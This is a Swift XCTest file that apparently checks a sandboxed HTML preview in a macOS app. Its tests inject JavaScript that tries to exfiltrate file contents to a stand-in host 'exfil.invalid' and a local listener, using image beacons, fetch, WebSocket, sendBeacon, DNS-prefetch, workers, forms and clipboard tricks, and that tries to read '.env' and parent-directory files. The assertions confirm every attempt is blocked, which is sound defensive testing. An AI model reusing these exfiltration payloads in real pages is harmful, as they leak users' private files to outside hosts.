import Network
import WebKit
import XCTest
@testable import Threadbear
@testable import ThreadbearCore

/// Daybreak finding 6, in a real web view: a local HTML preview served by
/// the pool's scheme handler can load the style and picture it names, and
/// can't read a file beside it, by fetch, by file URL or by a picture's name.
@MainActor
final class LocalPreviewTests: XCTestCase {
    private var dir: URL!

    override func setUpWithError() throws {
        dir = FileManager.default.temporaryDirectory.appendingPathComponent("LocalPreviewTests-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
    }

    override func tearDownWithError() throws {
        try? FileManager.default.removeItem(at: dir)
    }

    private func write(_ name: String, _ data: Data) throws {
        try data.write(to: dir.appendingPathComponent(name))
    }

    /// A 1x1 PNG.
    private let png = Data(base64Encoded: "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==")!

    /// A server on this Mac standing in for an attacker's: counts every
    /// connection, so a test can see that nothing reached it.
    private final class Listener: @unchecked Sendable {
        let listener: NWListener
        private let lock = NSLock()
        private var _hits = 0
        private var _requests: [String] = []
        var hits: Int { lock.withLock { _hits } }
        /// Each request's first line, to say which way out was found.
        var requests: [String] { lock.withLock { _requests } }
        var port: UInt16 { listener.port?.rawValue ?? 0 }

        init() throws {
            listener = try NWListener(using: .tcp, on: .any)
            listener.newConnectionHandler = { [weak self] connection in
                self?.lock.withLock { self?._hits += 1 }
                connection.start(queue: .global())
                connection.receive(minimumIncompleteLength: 1, maximumLength: 4096) { data, _, _, _ in
                    let line = data.flatMap { String(data: $0, encoding: .utf8)?.components(separatedBy: "\r\n").first } ?? "(nothing)"
                    self?.lock.withLock { self?._requests.append(line) }
                    connection.send(content: Data("HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n".utf8), completion: .contentProcessed { _ in connection.cancel() })
                }
            }
        }

        func start() async throws {
            listener.start(queue: .global())
            for _ in 0..<50 where listener.port == nil || listener.state != .ready { try await Task.sleep(for: .milliseconds(20)) }
        }

        deinit { listener.cancel() }
    }

    /// Waits for the preview to finish loading, then runs `body` as the
    /// app's own script in the page (WebKit runs that with the page's
    /// scripts off), standing in for what a page's script or a click would do.
    private func loaded(_ view: WKWebView) async throws {
        for _ in 0..<100 {
            try await Task.sleep(for: .milliseconds(100))
            if view.url?.scheme == LocalPreviewSchemeHandler.scheme, !view.isLoading,
               (try? await view.evaluateJavaScript("document.readyState") as? String) == "complete" { return }
        }
        XCTFail("the page never finished")
    }

    private func run(_ body: String, in view: WKWebView) async throws -> Any? {
        try await view.callAsyncJavaScript(body, contentWorld: .page)
    }

    /// The last verify-fix round: a page's own scripts don't run, so a file
    /// its markup names (`<a href="private.png">`) can be shown but never
    /// read, and the inline script that tries to read it and send it out
    /// does nothing. The ways out are then tried as clicks and as the app's
    /// own script, against a server on this Mac, and none reaches it.
    func testAPreviewsScriptsDontRunAndNothingGetsOut() async throws {
        let server = try Listener()
        try await server.start()
        // Loopback, which skips proxies, so only the rule list, the policy
        // and the link guard stand between the page and this server.
        let host = "127.0.0.1"
        let out = "http://\(host):\(server.port)"
        // And a named host, which goes to the preview's proxy: here a second
        // listener, standing in for the closed port the app uses.
        let sink = try Listener()
        try await sink.start()
        let named = "http://exfil.invalid:\(server.port)"
        // Sanity: the server answers outside the preview.
        let (_, response) = try await URLSession.shared.data(from: URL(string: out + "/ping")!)
        XCTAssertEqual((response as? HTTPURLResponse)?.statusCode, 200)
        try await Task.sleep(for: .milliseconds(100))
        let before = server.hits
        XCTAssertGreaterThan(before, 0)

        try write("private.html", Data("<p>the secret</p>".utf8))
        try write("private.png", png)
        try write("index.html", Data("""
        <!doctype html><html><head><title>preview</title></head><body>
        <iframe src="private.html" id="f"></iframe>
        <a href="private.png">picture</a>
        <a id="away" href="\(out)/clicked">away</a>
        <a id="far" href="\(named)/clicked">far</a>
        <form id="form" method="post" action="\(out)/form"><input name="d" value="x"></form>
        <script>
        document.title = 'script ran';
        fetch('private.png').then(r => r.arrayBuffer()).then(b => {
          new Image().src = '\(out)/img?d=' + b.byteLength;
          fetch('\(out)/fetch?d=' + b.byteLength, { mode: 'no-cors' });
          location.href = '\(out)/location?d=' + b.byteLength;
        });
        </script></body></html>
        """.utf8))

        let pool = WebPanelPool(defaults: UserDefaults(suiteName: "LocalPreviewTests.\(UUID().uuidString)")!)
        pool.previewProxy = .hostPort(host: "127.0.0.1", port: NWEndpoint.Port(rawValue: sink.port)!)
        let view = pool.webView(for: dir.appendingPathComponent("index.html"))
        try await loaded(view)
        // The page's own script never ran.
        let title = try await view.evaluateJavaScript("document.title") as? String
        XCTAssertEqual(title, "preview")
        // The page beside it isn't served, even framed.
        let framed = try? await view.evaluateJavaScript("document.getElementById('f').contentDocument?.body?.innerText ?? 'none'") as? String
        XCTAssertFalse((framed ?? "").contains("the secret"))
        let rtc = try await view.evaluateJavaScript("typeof RTCPeerConnection") as? String
        XCTAssertEqual(rtc, "undefined", "WebRTC goes round the proxy")
        // Were a script to run anyway, none of its ways out work.
        let fetched = try await run("""
        const d = 'x';
        new Image().src = '\(out)/img?d=' + d;
        new Image().src = '\(named)/img?d=' + d;
        try { navigator.sendBeacon('\(out)/beacon', d); } catch (e) {}
        try { new WebSocket('ws://\(host):\(server.port)/ws'); } catch (e) {}
        const link = document.createElement('link'); link.rel = 'stylesheet'; link.href = '\(out)/css?d=' + d; document.head.appendChild(link);
        try { window.open('\(out)/popup?d=' + d); } catch (e) {}
        try { await fetch('\(named)/fetch?d=' + d, { mode: 'no-cors' }); } catch (e) {}
        try { await fetch('\(out)/fetch?d=' + d, { mode: 'no-cors' }); return 'sent'; } catch (e) { return 'blocked'; }
        """, in: view) as? String
        XCTAssertEqual(fetched, "blocked")
        // And clicks on its links, its form, and a location change.
        _ = try await run("document.getElementById('far').click()", in: view)
        try await Task.sleep(for: .milliseconds(500))
        _ = try await run("document.getElementById('away').click()", in: view)
        try await Task.sleep(for: .milliseconds(500))
        _ = try? await run("document.getElementById('form').submit()", in: view)
        try await Task.sleep(for: .milliseconds(500))
        _ = try? await run("location.href = '\(out)/location'", in: view)
        try await Task.sleep(for: .seconds(2))
        // Nothing reached the server, and the page is still the preview.
        XCTAssertEqual(server.hits, before, "a request got out of the preview: \(server.requests)")
        // At most a bare CONNECT reached the proxy (a closed port in the app),
        // never a request with the page's data in it.
        XCTAssertTrue(sink.requests.allSatisfy { $0.hasPrefix("CONNECT ") }, "\(sink.requests)")
        XCTAssertEqual(view.url?.scheme, LocalPreviewSchemeHandler.scheme)
        XCTAssertEqual(view.url?.lastPathComponent, "index.html")
    }

    /// A page still shows its own style and picture, with its scripts off,
    /// and the files beside it it doesn't name aren't served.
    func testAPreviewShowsItsStyleAndPicture() async throws {
        try write("style.css", Data("body { color: rgb(1, 2, 3); }".utf8))
        try write("pic.png", png)
        try write("secret.png", png)
        try write(".env", Data("SECRET=hunter2".utf8))
        try write("notes.txt", Data("private".utf8))
        try write("index.html", Data("""
        <!doctype html><html><head><title>preview</title><link rel="stylesheet" href="style.css"></head><body>
        <img id="pic" src="pic.png"><script>document.title = 'script ran';</script>
        </body></html>
        """.utf8))

        let pool = WebPanelPool(defaults: UserDefaults(suiteName: "LocalPreviewTests.\(UUID().uuidString)")!)
        let view = pool.webView(for: dir.appendingPathComponent("index.html"))
        try await loaded(view)
        let color = try await view.evaluateJavaScript("getComputedStyle(document.body).color") as? String
        let width = try await view.evaluateJavaScript("document.getElementById('pic').naturalWidth") as? NSNumber
        let title = try await view.evaluateJavaScript("document.title") as? String
        XCTAssertEqual(color, "rgb(1, 2, 3)")
        XCTAssertEqual(width?.intValue, 1)
        XCTAssertEqual(title, "preview", "the page's script ran")
        let refused = try await run("""
        async function tryRead(path) {
          try { const r = await fetch(path); return r.ok ? 'read:' + (await r.text()) : 'refused:' + r.status; }
          catch (e) { return 'refused:error'; }
        }
        return [await tryRead('.env'), await tryRead('notes.txt'), await tryRead('secret.png'), await tryRead('../x.png'),
                await tryRead('file://' + \(String(reflecting: dir.path)) + '/.env')];
        """, in: view) as? [String]
        XCTAssertEqual(refused?.count, 5)
        XCTAssertTrue(refused?.allSatisfy { $0.hasPrefix("refused") } ?? false, "\(refused ?? [])")
    }

    /// Run them (6 Nov 2026): the page's scripts run, so they can read
    /// what its markup names. Here a script reads `private.png` and tries
    /// every way out it has, and none reaches the server; a sibling it
    /// doesn't name, the static view's site and a rewritten page are all
    /// refused to it.
    func testAPageAllowedToRunScriptsStillCantGetAnythingOut() async throws {
        let server = try Listener()
        try await server.start()
        let out = "http://127.0.0.1:\(server.port)"
        let sink = try Listener()
        try await sink.start()
        let named = "http://exfil.invalid:\(server.port)"
        let (_, response) = try await URLSession.shared.data(from: URL(string: out + "/ping")!)
        XCTAssertEqual((response as? HTTPURLResponse)?.statusCode, 200)
        try await Task.sleep(for: .milliseconds(100))
        let before = server.hits

        try write("private.png", png)
        try write("secret.png", png)
        try write(".env", Data("SECRET=hunter2".utf8))
        let html = """
        <!doctype html><html><head><title>preview</title></head><body>
        <a href="private.png">picture</a>
        <a id="away" href="\(out)/clicked">away</a>
        <form id="form" method="post" action="\(out)/form"><input name="d" value="x"></form>
        <script>
        window.read = fetch('private.png').then(r => r.arrayBuffer()).then(b => b.byteLength);
        document.title = 'script ran';
        </script></body></html>
        """
        try write("index.html", Data(html.utf8))
        let digest = LocalPreviewSite.digest(Data(html.utf8))

        let pool = WebPanelPool(defaults: UserDefaults(suiteName: "LocalPreviewTests.\(UUID().uuidString)")!)
        pool.previewProxy = .hostPort(host: "127.0.0.1", port: NWEndpoint.Port(rawValue: sink.port)!)
        let page = dir.appendingPathComponent("index.html")
        let staticView = pool.webView(for: page)
        try await loaded(staticView)
        let view = pool.webView(for: page, scriptsFor: digest)
        XCTAssertFalse(view === staticView)
        try await loaded(view)
        let title = try await view.evaluateJavaScript("document.title") as? String
        XCTAssertEqual(title, "script ran", "allowed, so its scripts run")
        let staticTitle = try await staticView.evaluateJavaScript("document.title") as? String
        XCTAssertEqual(staticTitle, "preview", "the static view of the same file still runs none")
        // It can read what it names: that's what the other guards are for.
        let read = try await run("return await window.read", in: view) as? NSNumber
        XCTAssertEqual(read?.intValue, png.count)
        let staticHost = try XCTUnwrap(staticView.url?.host)

        // Everything the page's script could do with the bytes, from the page's own world.
        let tried = try await run("""
        const b = await window.read; const d = 'len' + b;
        const results = [];
        async function tryRead(path) {
          try { const r = await fetch(path); return r.ok ? 'read' : 'refused:' + r.status; } catch (e) { return 'refused:error'; }
        }
        results.push(await tryRead('secret.png'), await tryRead('.env'),
                     await tryRead('threadbear-preview://\(staticHost)/index.html'));
        new Image().src = '\(out)/img?d=' + d;
        new Image().src = '\(named)/img?d=' + d;
        try { navigator.sendBeacon('\(out)/beacon', d); } catch (e) {}
        try { new WebSocket('ws://127.0.0.1:\(server.port)/ws'); } catch (e) {}
        try { new EventSource('\(out)/sse?d=' + d); } catch (e) {}
        const link = document.createElement('link'); link.rel = 'stylesheet'; link.href = '\(out)/css?d=' + d; document.head.appendChild(link);
        const pre = document.createElement('link'); pre.rel = 'prefetch'; pre.href = '\(out)/prefetch?d=' + d; document.head.appendChild(pre);
        const dns = document.createElement('link'); dns.rel = 'dns-prefetch'; dns.href = '//' + d + '.exfil.invalid'; document.head.appendChild(dns);
        const frame = document.createElement('iframe'); frame.src = '\(out)/frame?d=' + d; document.body.appendChild(frame);
        const obj = document.createElement('object'); obj.data = '\(out)/object?d=' + d; document.body.appendChild(obj);
        const audio = document.createElement('audio'); audio.src = '\(out)/audio?d=' + d; document.body.appendChild(audio);
        try { window.open('\(out)/popup?d=' + d); } catch (e) {}
        try { const w = new Worker(URL.createObjectURL(new Blob(["fetch('\(out)/worker?d=" + d + "', {mode:'no-cors'})"]))); } catch (e) {}
        try { await fetch('\(named)/fetch?d=' + d, { mode: 'no-cors' }); } catch (e) {}
        try { await fetch('\(out)/fetch?d=' + d, { mode: 'no-cors' }); results.push('sent'); } catch (e) { results.push('blocked'); }
        document.getElementById('away').click();
        return results;
        """, in: view) as? [String]
        XCTAssertEqual(tried?.count, 4)
        XCTAssertTrue(tried?.prefix(3).allSatisfy { $0.hasPrefix("refused") } ?? false, "\(tried ?? [])")
        XCTAssertEqual(tried?.last, "blocked")
        try await Task.sleep(for: .milliseconds(500))
        _ = try? await run("document.getElementById('form').submit()", in: view)
        try await Task.sleep(for: .milliseconds(500))
        _ = try? await run("location.href = '\(out)/location?d=x'", in: view)
        try await Task.sleep(for: .seconds(2))
        XCTAssertEqual(server.hits, before, "a request got out of the preview: \(server.requests)")
        XCTAssertTrue(sink.requests.allSatisfy { $0.hasPrefix("CONNECT ") }, "\(sink.requests)")
        XCTAssertEqual(view.url?.scheme, LocalPreviewSchemeHandler.scheme)

        // No way out through the OS either: no async clipboard, here or in a
        // frame the script makes, and its copy and drag handlers never run.
        let osRoutes = try await run("""
        const seen = [];
        addEventListener('copy', (e) => { seen.push('copy'); e.clipboardData.setData('text/plain', 'secret'); e.preventDefault(); }, true);
        document.addEventListener('dragstart', () => seen.push('drag'));
        document.dispatchEvent(new ClipboardEvent('copy', { bubbles: true, cancelable: true, clipboardData: new DataTransfer() }));
        document.body.dispatchEvent(new DragEvent('dragstart', { bubbles: true, cancelable: true }));
        const f = document.createElement('iframe'); document.body.appendChild(f);
        await new Promise((r) => setTimeout(r, 200));
        return [typeof navigator.clipboard, typeof f.contentWindow.navigator.clipboard, seen.join(',')];
        """, in: view) as? [String]
        XCTAssertEqual(osRoutes, ["undefined", "undefined", ""], "\(osRoutes ?? [])")

        // Natively too: what a script can't be stopped at in the page (Copy
        // Link in the menu, Copy, Services, a drag) does nothing in this view.
        let sealed = try XCTUnwrap(view as? SealedPreviewWebView)
        XCTAssertNil(sealed.menu(for: NSEvent()))
        XCTAssertNil(sealed.validRequestor(forSendType: .string, returnType: nil))
        XCTAssertFalse(sealed.writeSelection(to: NSPasteboard(name: .init("LocalPreviewTests")), types: [.string]))
        _ = try await run("document.body.append('selected'); getSelection().selectAllChildren(document.body)", in: view)
        let pasteboard = NSPasteboard.general.changeCount
        sealed.copy(nil)
        try await Task.sleep(for: .milliseconds(300))
        XCTAssertEqual(NSPasteboard.general.changeCount, pasteboard, "Copy wrote to the pasteboard")
        XCTAssertFalse(staticView is SealedPreviewWebView)
        // And a copy the page makes itself, after wiping the page (which
        // drops in-page listeners) and from a frame of its own. The app's
        // script runs as a click would, so WebKit would allow the copy.
        let saved = NSPasteboard.general.string(forType: .string)
        defer {
            if NSPasteboard.general.changeCount != pasteboard {
                NSPasteboard.general.clearContents()
                if let saved { NSPasteboard.general.setString(saved, forType: .string) }
            }
        }
        // And it can't be talked round: a name that changes each time it's
        // read is read once, and nothing the page replaces later is used.
        let tricks = try await run("""
        let reads = 0;
        document.execCommand({ toString() { reads += 1; return reads === 1 ? 'bold' : 'copy'; } });
        const used = [];
        const originals = [String.prototype.toLowerCase, Function.prototype.call, Function.prototype.apply, Reflect.apply];
        String.prototype.toLowerCase = function () { used.push('toLowerCase'); return 'bold'; };
        Function.prototype.call = function () { used.push('call'); };
        Function.prototype.apply = function () { used.push('apply'); };
        Reflect.apply = function () { used.push('Reflect.apply'); };
        document.execCommand('copy');
        [String.prototype.toLowerCase, Function.prototype.call, Function.prototype.apply, Reflect.apply] = originals;
        return [String(reads), used.join(',')];
        """, in: view) as? [String]
        XCTAssertEqual(tricks, ["1", ""])
        // Its own frames still load (the scripts-on CSP keeps the scheme's).
        let ownFrame = try await run("""
        const f = document.createElement('iframe'); f.src = location.href; document.body.appendChild(f);
        await new Promise((r) => { f.onload = r; setTimeout(r, 2000); });
        let data = 'none';
        const d = document.createElement('iframe'); d.src = 'data:text/html,<title>d</title>'; document.body.appendChild(d);
        await new Promise((r) => setTimeout(r, 500));
        try { data = d.contentDocument ? 'loaded' : 'blocked'; } catch (e) { data = 'blocked'; }
        return [f.contentDocument?.title ?? 'none', data];
        """, in: view) as? [String]
        XCTAssertEqual(ownFrame?.first, "script ran", "a frame of the page itself")
        // WebKit lets a page copy only during a click, which a test can't
        // give it, so this checks the guard is what the page gets: in the
        // page, in a frame it makes, and after document.open().
        let guarded = "String(!/native code/.test(document.execCommand.toString()) && document.execCommand('copy') === false)"
        let inFrame = try await run("""
        const f = document.createElement('iframe'); document.body.appendChild(f);
        const document_ = f.contentDocument;
        return String(!/native code/.test(document_.execCommand.toString()) && document_.execCommand('copy') === false);
        """, in: view) as? String
        _ = try? await view.evaluateJavaScript("document.open(); window.afterOpen = \(guarded); 0")
        let afterOpen = try? await view.evaluateJavaScript("String(window.afterOpen)") as? String
        let copied = [inFrame ?? "?", afterOpen ?? "?"]
        XCTAssertEqual(copied, ["true", "true"], "the page can reach WebKit's own execCommand")
        try await Task.sleep(for: .milliseconds(300))
        XCTAssertEqual(NSPasteboard.general.changeCount, pasteboard, "the page's own copy reached the pasteboard: \(copied)")

        // Rewritten after Run them: a reload gets nothing, so the new script never runs.
        try write("index.html", Data(html.replacingOccurrences(of: "script ran", with: "rewritten ran").utf8))
        view.reload()
        try await Task.sleep(for: .seconds(1))
        let after = try? await view.evaluateJavaScript("document.title") as? String
        XCTAssertNotEqual(after, "rewritten ran")
    }


    /// SealedPreviewWebView replaces these by selector: if WebKit renamed
    /// one, the override would quietly do nothing.
    func testTheSelectorsSealedPreviewWebViewReplacesExist() {
        for name in ["draggingSession:sourceOperationMaskForDraggingContext:", "writeSelectionToPasteboard:types:", "copy:", "cut:"] {
            XCTAssertTrue(WKWebView.instancesRespond(to: NSSelectorFromString(name)), name)
        }
    }


    /// A request as WebKit hands one to the scheme handler, recording what
    /// it's answered with and on which thread.
    private final class FakeTask: NSObject, WKURLSchemeTask {
        let request: URLRequest
        var status: Int?
        var bytes = 0
        var finished = false
        var calls = 0
        var offMain = false
        init(_ url: URL) { request = URLRequest(url: url) }
        func didReceive(_ response: URLResponse) { note(); status = (response as? HTTPURLResponse)?.statusCode }
        func didReceive(_ data: Data) { note(); bytes += data.count }
        func didFinish() { note(); finished = true }
        func didFailWithError(_ error: Error) { note(); finished = true }
        private func note() { calls += 1; if !Thread.isMainThread { offMain = true } }
    }

    /// Daybreak, 7 Nov 2026: the handler read each file, and a page or
    /// stylesheet for what it names, on the main thread as WebKit asked.
    /// Now it's read off it and answered on it, and a request WebKit stopped
    /// in the meantime is never answered (WebKit throws if it is).
    func testFilesAreReadOffTheMainThreadAndAStoppedRequestIsNotAnswered() async throws {
        try write("index.html", Data(("<img src=\"pic.png\">" + String(repeating: "<p>x</p>", count: 400_000)).utf8))
        try write("pic.png", png)
        let handler = LocalPreviewSchemeHandler()
        let readOnMain = NSLock()
        nonisolated(unsafe) var reads: [Bool] = []
        LocalPreviewSchemeHandler.readHook = { readOnMain.withLock { reads.append(Thread.isMainThread) } }
        defer { LocalPreviewSchemeHandler.readHook = nil }
        let view = WKWebView(frame: .zero)
        let page = try XCTUnwrap(handler.address(for: dir.appendingPathComponent("index.html")))
        let first = FakeTask(page)
        handler.webView(view, start: first)
        XCTAssertEqual(first.calls, 0, "answered later, not while WebKit waits on the main thread")
        for _ in 0..<100 where !first.finished { try await Task.sleep(for: .milliseconds(20)) }
        XCTAssertTrue(first.finished)
        XCTAssertEqual(first.status, 200)
        XCTAssertFalse(first.offMain, "answered on the main thread")

        let pic = page.deletingLastPathComponent().appendingPathComponent("pic.png")
        let stopped = FakeTask(pic)
        handler.webView(view, start: stopped)
        handler.webView(view, stop: stopped)
        let after = FakeTask(pic)
        handler.webView(view, start: after)
        for _ in 0..<100 where !after.finished { try await Task.sleep(for: .milliseconds(20)) }
        XCTAssertEqual(after.status, 200)
        try await Task.sleep(for: .milliseconds(200))
        XCTAssertEqual(stopped.calls, 0, "a stopped request is never answered")
        XCTAssertEqual(readOnMain.withLock { reads }, [false, false, false], "each file read off the main thread")
    }
}
